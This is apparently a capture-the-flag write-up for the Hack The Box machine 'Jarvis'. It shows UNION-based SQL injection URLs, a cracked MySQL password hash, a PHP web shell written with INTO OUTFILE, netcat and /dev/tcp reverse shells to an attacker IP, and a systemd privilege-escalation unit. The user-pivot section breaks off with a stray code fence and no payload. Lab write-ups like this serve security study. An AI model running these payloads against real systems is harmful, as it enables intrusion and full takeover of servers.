This time around, we got a Tony Stark themed box- Jarvis. This box was the first time playing around with sql injection. The box taught me how to perform UNION SELECT to enumerate the database by hand rather than using a tool such as sqlmap.

The website seems to be Tony stark themed, pretty nice. It's running php based on the nmap scan.

## Foothold
---
![](https://i.imgur.com/4e9VEeS.png)

The rooms pages are based on a php file passing the arguments into queries in mysql. This may be vulnerable to sql injection.
```
http://jarvis.htb/room.php?cod=2
```
We can try a UNION SELECT to try to dump the tables. After some testing, there are 7 entries.
```
http://jarvis.htb/room.php?cod=2 UNION SELECT 1,2,3,4,5,6,7
```
This returns the same entry as the default.

---

```
http://jarvis.htb/room.php?cod=100 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7 FROM information_schema.schemata
```
This query shows us what tables are available

---

```
http://jarvis.htb/room.php?cod=100 UNION SELECT 1,group_concat(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema='mysql'
```
And this is what is inside of mysql
![](https://i.imgur.com/UzKc47v.png)

---

```bash=
http://jarvis.htb/room.php?cod=100 UNION SELECT 1,2,user,password,5,6,7 FROM mysql.user
```

And to grab from user within mysql

DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0

While I initially attempted to just spray this password,
>"This looks like a hash" - Sydney.
She's correct. It is a mysql password hash. Tossing it into crackstation should do the trick.

The crack for it is "imissyou"

These creds are going to be used for the phpmyadmin page earlier

From here we can write a webshell into the webroot, or atleast where we assume the webroot was.
![](https://i.imgur.com/q831hW4.png)

```
select "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php" 
```

From here we can execute commands from jarvis.htb/shell.php using the cmd parameter that we wrote in.

`nc -c bash 10.10.14.19 4444`

Push that into the command line

```
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.143] 60950
whoami
www-data
```

We have shell

## User
---
Check sudo perms
`sudo -l`
```
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Looks like we can run this certain command as pepper. Would not be a bad idea to try to pivot to a different user to see if we can potentially abuse anything new.

```
def exec_ping():              
    forbidden = ['&', ';', '-', '`', '||', '|']                                               
    command = input('Enter an IP: ')    
    for i in forbidden:                                                                                                                                                                      
        if i in command:
            print('Got you')                   
            exit()     
    os.system('ping ' + command)
```

Looks like command injection is possible within that command we are running. We can pass on a variable into the ip parameter. However, there is input sanitization. We can get around this by wrapping our command/file we want to run in a variable.

```

We have user :)

## Root
---
So we have systemctl as a SUID from linpeas. The following steps were performed from a list of instructions from [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#suid)

```
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.19/9001 0>&1'

[Install]
WantedBy=multi-user.target
```

Call this file root.service
Enable and start the service

`systemctl enable /home/pepper/root.service`
```
Created symlink /etc/systemd/system/multi-user.target.wants/root.service → /home/pepper/root.service.
Created symlink /etc/systemd/system/root.service → /home/pepper/root.service.
```
`systemctl start root`

```
listening on [any] 9001 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.143] 39174
bash: cannot set terminal process group (7963): Inappropriate ioctl for device
bash: no job control in this shell
```
Pwned :)
